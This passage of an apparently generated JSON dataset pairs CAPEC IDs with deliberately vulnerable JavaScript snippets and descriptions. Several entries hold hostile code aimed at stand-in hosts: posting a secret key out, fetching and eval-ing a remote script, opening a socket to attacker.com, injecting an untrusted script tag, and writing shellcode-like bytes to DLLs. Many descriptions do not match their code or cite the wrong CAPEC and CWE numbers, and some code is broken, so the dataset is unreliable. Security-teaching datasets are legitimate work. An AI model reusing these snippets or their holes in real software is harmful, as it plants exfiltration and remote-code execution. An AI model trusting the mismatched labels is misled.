        "code_snippet": "const express = require('express');\nconst app = express();\nlet requestCount = 0;\n\napp.get('/api/data', (req, res) => {\n  if (requestCount < 5) {\n    requestCount++;\n    res.json({ message: 'Request accepted' });\n  } else {\n    res.status(403).json({ message: 'Rate limit exceeded' });\n  }\n});\n\napp.post('/api/submit', (req, res) => {\n  if (req.headers['x-request-origin'] === 'trusted-origin') {\n    // Perform sensitive operation\n    res.json({ message: 'Operation successful' });\n  } else {\n    res.status(401).json({ message: 'Unauthorized request' });\n  }\n});",
        "description": "This code snippet demonstrates a vulnerable Node.js Express.js server that is susceptible to social engineering attacks. The server allows a limited number of requests to the '/api/data' endpoint before rate limiting kicks in (CWE-799). However, the rate limit can be bypassed by sending requests with a spoofed 'X-Request-Origin' header, allowing an attacker to perform sensitive operations (CWE-940). Additionally, the server's behavior and response codes can be observed by an attacker, revealing information about the server's internal state (CWE-203, CWE-205). Furthermore, the server's inconsistent interpretation of HTTP requests can be exploited to smuggle malicious requests (CWE-444)."
    },
    {
        "capec_id": "423",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/api/data', (req, res) => {\n  const username = req.query.username;\n  const password = req.query.password;\n  if (username === 'admin' && password === 'password123') {\n    res.json({\n      'access_granted': true,\n      'data': 'sensitive_data'\n    });\n  } else {\n    res.json({\n      'access_granted': false,\n      'reason': 'Invalid credentials'\n    });\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable authentication mechanism that relies on a single factor (username and password) to grant access to sensitive data. The code uses a simple reflection attack to impersonate a trusted user, and the authentication protocol is observable, allowing an attacker to identify the internal state of the system. Additionally, the code relies on security through obscurity, as the password is hardcoded and easily accessible. This code also uses an implicit intent for sensitive communication, as the sensitive data is transmitted in plain text."
    },
    {
        "capec_id": "424",
        "code_snippet": "const users = {\n  admin: { role: 'admin', password: 'password123' },\n  user: { role: 'user', password: 'password123' }\n};\n\nfunction authenticate(username, password) {\n  if (users[username] && users[username].password === password) {\n    if (username === 'admin') {\n      return { status: 'success', role: 'admin' };\n    } else {\n      return { status: 'success', role: 'user' };\n    }\n  } else {\n    return { status: 'failure', message: 'Invalid username or password' };\n  }\n}\n\n// Reflection attack\nfunction reflectAttack(username, password) {\n  const response = authenticate(username, password);\n  if (response.status === 'success') {\n    return { status: 'success', message: 'Authenticated successfully' };\n  } else {\n    return { status: 'failure', message: 'Authentication failed' };\n  }\n}\n\n// Observable behavioral discrepancy\nfunction checkRole(username) {\n  if (users[username] && users[username].role === 'admin') {\n    return 'Admin';\n  } else {\n    return 'User';\n  }\n}\n\n// Reliance on a single factor in a security decision\nfunction grantAccess(role) {\n  if (role === 'admin') {\n    return true;\n  } else {\n    return false;\n  }\n}\n",
        "description": "This code snippet demonstrates the CAPEC of influencing a target's actions by leveraging human nature to assume behavior of others is appropriate. It includes CWEs 205, 203, 654, 301, and 207. The authenticate function has an observable behavioral discrepancy (CWE-205) as it returns different responses for admin and user roles. The reflectAttack function demonstrates a reflection attack (CWE-301) by using the authenticate function to impersonate a trusted user. The checkRole function has an observable behavioral discrepancy with equivalent products (CWE-207) as it returns different responses for admin and user roles. The grantAccess function relies on a single factor in a security decision (CWE-654) by only checking the role to grant access."
    },
    {
        "capec_id": "425",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst https = require('https');\nconst fs = require('fs');\n\napp.use(express.json());\n\nconst options = {\n  key: fs.readFileSync('server-key.pem'),\n  cert: fs.readFileSync('server-cert.pem')\n};\n\nconst server = https.createServer(options, app);\n\napp.post('/api/data', (req, res) => {\n  const { username, password } = req.body;\n  if (username === 'admin' && password === 'password') {\n    res.json({ message: 'Login successful!' });\n  } else {\n    res.json({ message: 'Invalid credentials. Please try again.' });\n  }\n});\n\nserver.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable JavaScript application that embodies the CAPEC 'Framing' technique. The application uses a single factor (username and password) to make a security decision (CWE-654), and the user interface misrepresents critical information by providing a generic error message when the credentials are invalid (CWE-451). Additionally, the application uses a self-signed certificate, which can be exploited by an adversary to perform a man-in-the-middle attack (CWE-941, CWE-757, CWE-300). The application also uses a weak password for the 'admin' user, making it vulnerable to brute-force attacks."
    },
    {
        "capec_id": "426",
        "code_snippet": "const incentive = getIncentiveFromUserInput();\nconst resource = createResource(incentive);\nconst communicationChannel = createCommunicationChannel(resource);\n\nif (isAuthorized(incentive)) {\n  sendRequest(communicationChannel, 'https://example.com/malicious-endpoint');\n} else {\n  console.log('Access denied');\n}\n\nfunction createResource(incentive) {\n  if (incentive === 'monetary') {\n    return createMonetaryResource();\n  } else if (incentive === 'social') {\n    return createSocialResource();\n  } else {\n    return createIdeologicalResource();\n  }\n}\n\nfunction createCommunicationChannel(resource) {\n  return new WebSocket('ws://' + resource + ':8080');\n}\n\nfunction isAuthorized(incentive) {\n  if (incentive === 'monetary' && getBalance() > 1000) {\n    return true;\n  } else if (incentive === 'social' && getSocialStatus() === 'influencer') {\n    return true;\n  } else if (incentive === 'ideological' && getMorals() === 'liberal') {\n    return true;\n  } else {\n    return false;\n  }\n}",
        "description": "This code snippet demonstrates the CAPEC of manipulating a target's behavior through incentivization. The code uses the CWEs of Creation of Emergent Resource (CWE-1229), Asymmetric Resource Consumption (CWE-405), Incorrectly Specified Destination in a Communication Channel (CWE-941), Reliance on Security Through Obscurity (CWE-656), and Reliance on a Single Factor in a Security Decision (CWE-654) to create a vulnerable system. The code takes user input to determine the incentive, creates a resource based on the incentive, and establishes a communication channel to send a request to a malicious endpoint if the user is authorized. The authorization is based on a single factor, such as balance, social status, or morals, which can be easily manipulated by an attacker."
    },
    {
        "capec_id": "427",
        "code_snippet": "const userAuth = (username, password) => {\n  if (username === 'admin' && password === 'password123') {\n    return { authenticated: true, role: 'admin' };\n  } else if (username === 'user' && password === 'password123') {\n    return { authenticated: true, role: 'user' };\n  } else {\n    return { authenticated: false, error: 'Invalid credentials' };\n  }\n};\n\nconst login = (username, password) => {\n  const authResult = userAuth(username, password);\n  if (authResult.authenticated) {\n    // Truncate security-relevant information (CWE-222)\n    console.log(`Login successful for ${username}.`);\n    // Rely on a single factor in a security decision (CWE-654)\n    if (authResult.role === 'admin') {\n      return 'Admin dashboard';\n    } else {\n      return 'User dashboard';\n    }\n  } else {\n    // Observable behavioral discrepancy (CWE-205)\n    console.log(`Login failed for ${username}.`);\n    // External influence of sphere definition (CWE-673)\n    return 'Login failed';\n  }\n};\n\n// Reflection attack in an authentication protocol (CWE-301)\nconst reflectedUsername = 'admin';\nconst reflectedPassword = 'password123';\nconsole.log(login(reflectedUsername, reflectedPassword));",
        "description": "This code snippet demonstrates a vulnerable authentication system that can be influenced by an adversary through various psychological and social cues. The code relies on a single factor in a security decision (CWE-654), truncates security-relevant information (CWE-222), and exhibits observable behavioral discrepancies (CWE-205). Additionally, it is susceptible to external influence of sphere definition (CWE-673) and reflection attacks in an authentication protocol (CWE-301)."
    },
    {
        "capec_id": "428",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.use(express.json());\n\nlet trustedUsers = ['user1', 'user2'];\n\napp.post('/api/data', (req, res) => {\n  const { username, data } = req.body;\n  if (trustedUsers.includes(username)) {\n    // CWE-300: Channel Accessible by Non-Endpoint\n    // CWE-940: Improper Verification of Source of a Communication Channel\n    // No verification of the request origin\n    handleData(data);\n  } else {\n    // CWE-1229: Creation of Emergent Resource\n    // Creating a new resource that can be used by attackers\n    const newResource = createResource(data);\n    res.json({ message: 'Resource created successfully' });\n  }\n});\n\napp.get('/api/data', (req, res) => {\n  const { username } = req.query;\n  if (trustedUsers.includes(username)) {\n    // CWE-222: Truncation of Security-relevant Information\n    // Truncating the display of security-relevant information\n    const truncatedData = truncateData(getData());\n    res.json(truncatedData);\n  } else {\n    // CWE-301: Reflection Attack in an Authentication Protocol\n    // Impersonating a trusted user\n    const impersonatedUser = 'user1';\n    res.json({ message: `Hello, ${impersonatedUser}!` });\n  }\n});",
        "description": "This code snippet demonstrates a vulnerable API that can be exploited using the CAPEC technique of tailoring communication to the target's language and thought patterns. The API has multiple vulnerabilities, including lack of verification of the request origin, creation of emergent resources, truncation of security-relevant information, and impersonation of trusted users."
    },
    {
        "capec_id": "429",
        "code_snippet": "const eyeTracking = (user) => {\n  const gazeData = getGazeData(user);\n  const passwordLength = getPasswordLength(user);\n  const truncatedGazeData = truncateGazeData(gazeData, passwordLength);\n  const captchaChallenge = generateCaptchaChallenge(truncatedGazeData);\n  const userInput = promptUserForInput(captchaChallenge);\n  if (userInput === captchaChallenge) {\n    // Grant access\n  } else {\n    // Deny access\n  }\n};\n\nconst getPasswordLength = (user) => {\n  // Return the length of the user's password based on their gaze data\n  // This is an example of CWE-205: Observable Behavioral Discrepancy\n  return gazeData.length;\n};\n\nconst truncateGazeData = (gazeData, passwordLength) => {\n  // Truncate the gaze data to obscure the source or nature of the attack\n  // This is an example of CWE-222: Truncation of Security-relevant Information\n  return gazeData.substring(0, passwordLength);\n};\n\nconst generateCaptchaChallenge = (truncatedGazeData) => {\n  // Generate a CAPTCHA challenge based on the truncated gaze data\n  // This is an example of CWE-804: Guessable CAPTCHA\n  return truncatedGazeData + \"?\";\n};",
        "description": "This code snippet demonstrates a vulnerable implementation of an eye-tracking based authentication system. The system uses the user's gaze data to determine the length of their password, which is an observable behavioral discrepancy (CWE-205). The gaze data is then truncated to obscure the source or nature of the attack (CWE-222). A CAPTCHA challenge is generated based on the truncated gaze data, but it is guessable (CWE-804). The user is prompted to input the CAPTCHA challenge, and if they succeed, they are granted access. However, this implementation is vulnerable to attacks that can observe and exploit the behavioral discrepancies and truncation of security-relevant information."
    },
    {
        "capec_id": "430",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst debug = require('debug')('myapp');\n\napp.get('/', (req, res) => {\n  const sensitiveData = 'secretKey';\n  debug(sensitiveData);\n  res.send('Hello World!');\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable server-side application that exposes sensitive information through debug log files (CWE-534) and server log files (CWE-533). The 'debug' module is used to log sensitive data, which can be accessed by an attacker through the log files. Additionally, the code has an excessive attack surface (CWE-1125) due to the use of unnecessary dependencies and logging mechanisms. The transient execution of incorrect operations (CWE-1420) and exposure of microarchitectural state (CWE-1342) can also be exploited by an attacker to gain access to sensitive information."
    },
    {
        "capec_id": "431",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/user', (req, res) => {\n  const userInput = req.query.name;\n  const template = `<h1>Hello, ${userInput}!</h1>`;\n  res.send(template);\n});\n\napp.use((err, req, res, next) => {\n  const errorHtml = `<h1>Error: ${err.message}</h1><p>Stack trace: ${err.stack}</p>`;\n  res.status(500).send(errorHtml);\n});",
        "description": "This code snippet demonstrates a vulnerable JavaScript application that is susceptible to multiple security issues. The code uses a template engine to generate an HTML response based on user input, but it does not properly validate or neutralize the input, making it vulnerable to CWE-1336 (Improper Neutralization of Special Elements Used in a Template Engine). Additionally, the error handling mechanism generates an error message that includes sensitive information about the environment and stack trace, which is a CWE-209 (Generation of Error Message Containing Sensitive Information). The code also has an excessive attack surface due to the lack of input validation, which is a CWE-1125 (Excessive Attack Surface). Furthermore, the error message is not properly neutralized, making it vulnerable to CWE-81 (Improper Neutralization of Script in an Error Message Web Page). Finally, the code does not validate the syntactic correctness of the input, which is a CWE-1286 (Improper Validation of Syntactic Correctness of Input)."
    },
    {
        "capec_id": "432",
        "code_snippet": "const userInput = '\" OR 1=1 -- ';\nconst query = `SELECT * FROM users WHERE name = ${userInput};`;\nconsole.log(query);\n\n// Server-side logging with debug logs enabled\nconst debugLog = (message) => {\n  const logFile = './log/debug.log';\n  fs.appendFile(logFile, message, (err) => {\n    if (err) {\n      console.error(err);\n    }\n  });\n};\n\n// CAPTCHA challenge with guessable answer\nconst captchaChallenge = () => {\n  const answer = Math.floor(Math.random() * 10);\n  return `What is ${answer} + 2?`;\n};\n\n// Validation of syntactic correctness of input\nconst validateInput = (input) => {\n  if (input.includes(';')) {\n    return false;\n  }\n  return true;\n};\n\n// Example usage\nconst userInput2 = 'Robert; DROP TABLE users;';\nif (validateInput(userInput2)) {\n  console.log('Input is valid');\n} else {\n  console.log('Input is invalid');\n}",
        "description": "This code snippet demonstrates the CAPEC pattern of improper neutralization of quoting syntax. It includes a SQL injection vulnerability, a server-side logging mechanism with debug logs enabled, a CAPTCHA challenge with a guessable answer, and a weak validation of syntactic correctness of input. The code is vulnerable to various attacks, including SQL injection and information exposure through debug log files."
    },
    {
        "capec_id": "433",
        "code_snippet": "const net = require('net');\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    const bufferSize = 1024;\n    const buffer = Buffer.alloc(bufferSize);\n    data.copy(buffer, 0, 0, bufferSize);\n    const message = buffer.toString('utf8', 0, bufferSize);\n    console.log(`Received message: ${message}`);\n    // Process the message without verifying its integrity\n    processMessage(message);\n  });\n});\nserver.listen(8080, () => {\n  console.log('Server listening on port 8080');\n});\n\nfunction processMessage(message) {\n  // Perform operations on the message without checking its size\n  const outputBuffer = Buffer.alloc(1024);\n  outputBuffer.write(message, 0, message.length);\n  console.log(`Processed message: ${outputBuffer.toString('utf8', 0, message.length)}`);\n}",
        "description": "This JavaScript code snippet demonstrates a vulnerable server that receives messages from clients and processes them without verifying their integrity or checking their size. The server uses a fixed-size buffer to store the received message, which can lead to a buffer overflow if the message is larger than the buffer. The processed message is then logged to the console without any encryption, making it vulnerable to sniffing by unauthorized actors."
    },
    {
        "capec_id": "434",
        "code_snippet": "const sensitiveData = {\n  'userCount': 100,\n  'averageAge': 30,\n  'location': 'New York'\n};\n\nfunction getStatistics(query) {\n  if (query === 'userCount') {\n    return sensitiveData.userCount;\n  } else if (query === 'averageAge') {\n    return sensitiveData.averageAge;\n  } else if (query === 'location') {\n    return sensitiveData.location;\n  } else {\n    return 'Invalid query';\n  }\n}\n\n// CAPTCHA implementation with guessable answer\nfunction generateCaptcha() {\n  const captchaAnswer = Math.floor(Math.random() * 10);\n  return captchaAnswer;\n}\n\n// Incompatible policies implementation\nfunction checkAccess(userRole, data) {\n  if (userRole === 'admin') {\n    return data;\n  } else {\n    return 'Access denied';\n  }\n}\n\n// Missing source correlation implementation\nfunction processData(data) {\n  return data;\n}",
        "description": "This code snippet demonstrates the CAPEC-202: Exposure of Sensitive Information Through Data Queries. The getStatistics function returns sensitive information based on the query parameter. The generateCaptcha function implements a guessable CAPTCHA (CWE-804). The checkAccess function demonstrates incompatible policies (CWE-213) by returning sensitive data to admin users. The processData function lacks source correlation (CWE-1293) and relies on a single source of data. An attacker can exploit these vulnerabilities to infer sensitive information."
    },
    {
        "capec_id": "435",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.post('/api/data', (req, res) => {\n  const origin = req.headers.origin;\n  if (origin !== 'http://trusted-origin.com') {\n    // Insecurely trusting the 'origin' header\n    res.set('Access-Control-Allow-Origin', origin);\n  }\n  res.send('Data sent to ' + origin);\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates the CAPEC 'Channel Accessible by Non-Endpoint' by not properly verifying the identity of actors at both ends of a communication channel. It uses the CWEs '941: Incorrectly Specified Destination in a Communication Channel' and '940: Improper Verification of Source of a Communication Channel' by trusting the 'origin' header sent by the client, which can be easily spoofed. This allows an attacker to access the channel and influence the communication. Additionally, it relates to CWE '205: Observable Behavioral Discrepancy' as the server's behavior can be observed by unauthorized actors, revealing its internal state."
    },
    {
        "capec_id": "438",
        "code_snippet": "const maliciousComponent = {\n  init: function() {\n    // Backdoor code to send confidential information to OSAT vendor\n    const xhr = new XMLHttpRequest();\n    xhr.open('POST', 'https://osat-vendor.com/collectData', true);\n    xhr.send('confidentialInfo=' + getConfidentialInfo());\n  },\n  getConfidentialInfo: function() {\n    // Access unprotected confidential information\n    return 'secretKey=' + getSecretKeyFromUnprotectedStorage();\n  }\n};\n\n// Release product in non-release configuration\nif (process.env.NODE_ENV !== 'production') {\n  maliciousComponent.init();\n}\n\n// Insufficient technical documentation\nconst componentDocumentation = {\n  description: 'Malicious component with backdoor'\n};\n\n// Reliance on component that is not updateable\nconst outdatedComponent = {\n  version: '1.0',\n  vulnerabilities: ['CVE-2022-1234', 'CVE-2022-5678']\n};\n\n// Reliance on insufficiently trustworthy component\nconst untrustedComponent = {\n  init: function() {\n    // Malicious code to exploit vulnerabilities\n    exploit(outdatedComponent.vulnerabilities);\n  }\n};",
        "description": "This code snippet demonstrates a malicious component that is integrated into a product during the manufacturing process. The component contains a backdoor to send confidential information to an OSAT vendor, and it is released in a non-release configuration. The component lacks sufficient technical documentation, and it relies on an outdated and untrusted component that is not updateable, making it vulnerable to exploitation."
    },
    {
        "capec_id": "439",
        "code_snippet": "const thirdPartyComponent = require('vulnerable-library');\n\n// Release in non-release configuration\nprocess.env.NODE_ENV = 'development';\n\n// Expose sensitive information\nconsole.log('Database credentials:', dbUsername, dbPassword);\n\n// Use vulnerable third-party component\nthirdPartyComponent.init();\n\n// Insufficiently trusted component\nconst untrustedComponent = require('untrusted-library');\n\n// Observable behavioral discrepancy\nif (process.env.NODE_ENV === 'production') {\n  untrustedComponent.doSomething();\n} else {\n  console.log('Running in development mode');\n}",
        "description": "This code snippet demonstrates the CAPEC of undermining the integrity of a product during distribution. It includes multiple CWEs: CWE-1269 (release in non-release configuration), CWE-200 (exposure of sensitive information), CWE-1395 (dependency on vulnerable third-party component), CWE-1357 (reliance on insufficiently trustworthy component), and CWE-207 (observable behavioral discrepancy). The code uses a vulnerable third-party library, exposes database credentials, and behaves differently in production and development environments."
    },
    {
        "capec_id": "440",
        "code_snippet": "const firmwareUpdater = {\n  version: '1.2.3',\n  updateFirmware: function(newVersion) {\n    if (newVersion < this.version) {\n      // CWE-1328: Security Version Number Mutable to Older Versions\n      console.log('Downgrading firmware to version ' + newVersion);\n      this.version = newVersion;\n      // CWE-1329: Reliance on Component That is Not Updateable\n      const nonUpdateableComponent = require('non-updateable-component');\n      nonUpdateableComponent.doSomething();\n    } else {\n      console.log('Updating firmware to version ' + newVersion);\n      this.version = newVersion;\n    }\n  },\n  injectError: function() {\n    // CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n    console.log('Injecting error into redundant block');\n    // Simulate error injection\n    throw new Error('Injected error');\n  }\n};\n\n// CWE-1247: Improper Protection Against Voltage and Clock Glitches\nconst voltageGlitch = {\n  occur: function() {\n    console.log('Voltage glitch occurred');\n    // Simulate voltage glitch\n    firmwareUpdater.injectError();\n  }\n};\n\n// CWE-1248: Semiconductor Defects in Hardware Logic with Security-Sensitive Implications\nconst defectiveHardware = {\n  malfunction: function() {\n    console.log('Hardware malfunction due to semiconductor defect');\n    firmwareUpdater.injectError();\n  }\n};",
        "description": "This code snippet demonstrates a firmware updater that can be downgraded to an older version, allowing an attacker to exploit known vulnerabilities. It also includes a non-updateable component that can be used to inject errors, and simulates voltage glitches and semiconductor defects that can cause the system to malfunction."
    },
    {
        "capec_id": "441",
        "code_snippet": "const maliciousFirmware = {\n  update: function() {\n    // CWE-506: Embedded Malicious Code\n    const virus = new MaliciousCode();\n    virus.replicate();\n  },\n  accessControl: function() {\n    // CWE-284: Improper Access Control\n    return true; // always grant access\n  },\n  createResource: function() {\n    // CWE-1229: Creation of Emergent Resource\n    const emergentResource = new Resource();\n    emergentResource.grantAccessToAll();\n  }\n};\n\n// CWE-1277: Firmware Not Updateable\nObject.freeze(maliciousFirmware);\n\n// CWE-509: Replicating Malicious Code (Virus or Worm)\nmaliciousFirmware.update();",
        "description": "This code snippet demonstrates a malicious firmware that exploits improper access control, embedded malicious code, creation of emergent resources, and replicating malicious code. The firmware is designed to be non-updatable, allowing the malicious code to persist and spread."
    },
    {
        "capec_id": "442",
        "code_snippet": "const maliciousCode = `const xhr = new XMLHttpRequest(); xhr.open('GET', 'https://malicious-website.com/malicious-script.js', true); xhr.onload = function() { if (xhr.status === 200) { eval(xhr.responseText); } }; xhr.send();`; const benignSoftware = function() { console.log('This is a benign software.'); }; benignSoftware.toString = function() { return benignSoftware + maliciousCode; };",
        "description": "This code snippet demonstrates the CAPEC of adding malicious logic to benign software. The benign software is a simple function that logs a message to the console. However, the toString method of the function is overridden to include malicious code that downloads and executes a script from a remote location, which is a CWE-494: Download of Code Without Integrity Check. The malicious code is hidden from the user and works behind the scenes, which is a CWE-507: Trojan Horse. The code does not replicate itself, making it a CWE-508: Non-Replicating Malicious Code."
    },
    {
        "capec_id": "443",
        "code_snippet": "const adminPrivileges = {\n  canModifyCodebase: true,\n  canDownloadExternalCode: true\n};\n\nif (adminPrivileges.canModifyCodebase) {\n  // Inject malicious logic into the codebase\n  const maliciousCode = `const maliciousFunction = () => { console.log('Malicious code executed'); };`;\n  eval(maliciousCode);\n}\n\nif (adminPrivileges.canDownloadExternalCode) {\n  // Download code from an untrusted source without integrity check\n  const externalCodeUrl = 'https://untrusted-source.com/malicious-code.js';\n  const scriptTag = document.createElement('script');\n  scriptTag.src = externalCodeUrl;\n  document.head.appendChild(scriptTag);\n}\n\n// Create emergent resource with insecure inherited permissions\nconst emergentResource = {\n  permissions: {\n    read: true,\n    write: true,\n    execute: true\n  }\n};\n\n// Lack of administrator control over security\nconst securitySettings = {\n  enableFirewall: false,\n  enableAntivirus: false\n};",
        "description": "This code snippet demonstrates the CAPEC of an adversary using their privileged position to inject malicious logic into a codebase or product. It uses CWEs 506, 1229, 277, 494, and 671 for context. The code injects malicious logic into the codebase using eval(), downloads code from an untrusted source without integrity check, creates an emergent resource with insecure inherited permissions, and lacks administrator control over security settings."
    },
    {
        "capec_id": "444",
        "code_snippet": "function authenticateUser(username, password) {\n  // Compiler optimization removal of security-critical code (CWE-733)\n  if (username === 'admin' && password === 'password123') {\n    // Embedded malicious code (CWE-506)\n    eval(String.fromCharCode(102, 97, 108, 115, 101));\n    // Exposure of sensitive system information to an unauthorized control sphere (CWE-497)\n    console.log(process.env.SECRET_KEY);\n    return true;\n  }\n  // Improper control of dynamically-managed code resources (CWE-913)\n  var userSession = {};\n  userSession.username = username;\n  userSession.password = password;\n  return userSession;\n}\n\n// Processor optimization removal or modification of security-critical code (CWE-1037)\nauthenticateUser.toString = function() {\n  return 'function authenticateUser() { return true; }';\n};",
        "description": "This code snippet demonstrates a development alteration attack where an adversary modifies the code during development to achieve a negative impact once the system is deployed. The code includes various CWEs such as compiler optimization removal of security-critical code, embedded malicious code, exposure of sensitive system information, and improper control of dynamically-managed code resources. The authenticateUser function appears to be a legitimate authentication mechanism, but it contains malicious code that can be leveraged later. The processor optimization removal or modification of security-critical code is demonstrated by overriding the toString method to return a modified version of the function."
    },
    {
        "capec_id": "445",
        "code_snippet": "const fs = require('fs');\nconst childProcess = require('childProcess');\n\n// CWE-506: Embedded Malicious Code\nconst maliciousCode = 'const net = require(\\'net\\'); const client = new net.Socket(); client.connect(8080, \\'attacker.com\\', function() { console.log(\\'Connected to attacker\\'); });';\n\n// CWE-913: Improper Control of Dynamically-Managed Code Resources\nconst dynamicCode = `eval(${maliciousCode})`;\n\n// CWE-1265: Unintended Reentrant Invocation of Non-reentrant Code Via Nested Calls\nfunction nonReentrantCode() {\n  childProcess.execSync('node -e ' + dynamicCode);\n}\n\n// CWE-829: Inclusion of Functionality from Untrusted Control Sphere\nconst untrustedLibrary = require('http').get({'host': 'untrusted.com', 'path': '/maliciousLibrary.js'}, (res) => {\n  let maliciousLibrary = '';\n  res.on('data', (chunk) => {\n    maliciousLibrary += chunk;\n  });\n  res.on('end', () => {\n    fs.writeFileSync('maliciousLibrary.js', maliciousLibrary);\n    require('./maliciousLibrary');\n  });\n});\n\n// CWE-494: Download of Code Without Integrity Check\nconst updateServer = 'http://update.example.com';\nconst updateScript = 'updateScript.js';\nconst updateUrl = `${updateServer}/${updateScript}`;\nconst updateCode = '';\nconst updateReq = require('http').get(updateUrl, (res) => {\n  res.on('data', (chunk) => {\n    updateCode += chunk;\n  });\n  res.on('end', () => {\n    fs.writeFileSync(updateScript, updateCode);\n    require(`./${updateScript}`);\n  });\n});",
        "description": "This code snippet demonstrates the CAPEC of exploiting a configuration management system to insert malicious logic into a software product's build, update, or deployment environment. It includes various CWEs such as embedded malicious code, improper control of dynamically-managed code resources, unintended reentrant invocation of non-reentrant code, inclusion of functionality from an untrusted control sphere, and download of code without integrity check."
    },
    {
        "capec_id": "446",
        "code_snippet": "const maliciousLibrary = require('vulnerable-third-party-lib');\n\nfunction processUserInput(input) {\n  const untrustedFunctionality = require('untrusted-control-sphere-lib').execute;\n  const result = untrustedFunctionality(input);\n  return result;\n}\n\nconst platformDependentComponent = require('platform-dependent-lib');\n\nif (platformDependentComponent.isWindows()) {\n  const maliciousDriver = require('malicious-driver');\n  maliciousDriver.init();\n}\n",
        "description": "This code snippet demonstrates a supply chain attack by including insecure third-party components into a technology or code-base. It includes a vulnerable third-party library, imports untrusted functionality from an external control sphere, embeds malicious code, relies on an insufficiently trustworthy component, and uses platform-dependent third-party components."
    },
    {
        "capec_id": "447",
        "code_snippet": "const crypto = require('crypto');\n\nfunction encryptData(data) {\n  // CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\n  // CWE-733: Compiler Optimization Removal or Modification of Security-critical Code\n  // CWE-657: Violation of Secure Design Principles\n  const algorithm = 'aes-256-cbc';\n  const password = 'my_secret_password';\n  const cipher = crypto.createCipher(algorithm, password);\n  let encrypted = cipher.update(data, 'utf8', 'hex');\n  encrypted += cipher.final('hex');\n  return encrypted;\n}\n\nfunction decryptData(encryptedData) {\n  // CWE-602: Client-Side Enforcement of Server-Side Security\n  // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n  const algorithm = 'aes-256-cbc';\n  const password = 'my_secret_password';\n  const decipher = crypto.createDecipher(algorithm, password);\n  let decrypted = decipher.update(encryptedData, 'hex', 'utf8');\n  decrypted += decipher.final('utf8');\n  return decrypted;\n}\n\n// CWE-657: Violation of Secure Design Principles\n// CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\n// CWE-733: Compiler Optimization Removal or Modification of Security-critical Code\nconst data = 'my_secret_data';\nconst encryptedData = encryptData(data);\nconsole.log('Encrypted Data:', encryptedData);\nconst decryptedData = decryptData(encryptedData);\nconsole.log('Decrypted Data:', decryptedData);",
        "description": "This code snippet demonstrates a design alteration attack, where an adversary modifies the design of a cryptographic system to achieve a negative impact. The code uses a weak encryption algorithm and stores the password in plaintext, violating secure design principles. The encryptData and decryptData functions are designed to be insecure, allowing an attacker to access sensitive system information. The code also relies on client-side enforcement of server-side security, which can be exploited by an attacker. The processor and compiler optimizations can further remove or modify security-critical code, making the system more vulnerable."
    },
    {
        "capec_id": "448",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// CWE-426: Untrusted Search Path\nlet dllPath = process.env.PATH.split(path.delimiter);\ndllPath.unshift('C:\\MaliciousDLLs');\nprocess.env.PATH = dllPath.join(path.delimiter);\n\n// CWE-506: Embedded Malicious Code\nlet maliciousCode = `\\x90\\x90\\x90\\x90\\x90\\xE8\\x00\\x00\\x00\\x00\\x58\\x35\\x30\\x30\\x20\\x42\\x59\\x41\\x59\\x41\\x59`;\nlet buffer = Buffer.alloc(1024, 0);\nbuffer.write(maliciousCode, 0, maliciousCode.length, 'binary');\nfs.writeFileSync('C:\\MaliciousDLLs\\malicious.dll', buffer);\n\n// CWE-1102: Reliance on Machine-Dependent Data Representation\nlet machineDependentCode = `\\x48\\x31\\xC9\\x48\\x31\\xD2\\x48\\x31\\xC0\\x48\\x31\\xDB`;\nbuffer = Buffer.alloc(1024, 0);\nbuffer.write(machineDependentCode, 0, machineDependentCode.length, 'binary');\nfs.writeFileSync('C:\\MaliciousDLLs\\machine_dependent.dll', buffer);\n\n// CWE-509: Replicating Malicious Code (Virus or Worm)\nlet virusCode = `\\x90\\x90\\x90\\x90\\x90\\xE8\\x00\\x00\\x00\\x00\\x58\\x35\\x30\\x30\\x20\\x42\\x59\\x41\\x59\\x41\\x59`;\nbuffer = Buffer.alloc(1024, 0);\nbuffer.write(virusCode, 0, virusCode.length, 'binary');\nfs.writeFileSync('C:\\MaliciousDLLs\\virus.dll', buffer);\n\n// CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nlet sensitiveInfo = process.env;\nfs.writeFileSync('C:\\MaliciousDLLs\\sensitive_info.txt', JSON.stringify(sensitiveInfo));",
        "description": "This code snippet demonstrates the CAPEC of tampering with a DLL and embedding a computer virus into gaps between legitimate machine instructions. It uses various CWEs to illustrate the vulnerability, including CWE-426 for untrusted search paths, CWE-506 for embedded malicious code, CWE-1102 for reliance on machine-dependent data representation, CWE-509 for replicating malicious code, and CWE-497 for exposure of sensitive system information."
    },
    {
        "capec_id": "449",
        "code_snippet": "const maliciousCode = `const fs = require('fs'); const path = require('path'); const userInput = 'AUX:\\evil\\file.txt'; const filePath = path.join(__dirname, userInput); fs.readFile(filePath, (err, data) => { if (err) { console.log('Error reading file: ' + err); } else { console.log('File contents: ' + data); } }); const firmwareUpdater = require('firmware-updater'); firmwareUpdater.updateFirmware('https://example.com/malicious-firmware.bin');`;",
        "description": "This JavaScript code snippet demonstrates a Trojan Horse attack (CWE-507) by embedding malicious code that reads a file from a Windows device name (CWE-67) and attempts to update firmware with a malicious binary (CWE-1277). The code also uses a non-ubiquitous API (CWE-589) by requiring a fictional 'firmware-updater' module. The malicious code is hidden from normal operation, violating the intended security policy of the user or system administrator."
    },
    {
        "capec_id": "450",
